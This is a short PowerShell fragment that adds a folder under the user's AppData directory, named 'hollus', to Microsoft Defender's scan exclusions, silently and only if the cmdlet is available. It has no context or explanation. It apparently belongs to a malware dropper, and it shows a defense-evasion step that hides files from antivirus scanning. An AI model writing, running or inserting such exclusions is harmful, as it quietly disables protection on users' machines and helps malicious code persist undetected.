$folderPath = "$env:APPDATA\hollus"

if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
    Add-MpPreference -ExclusionPath $folderPath
}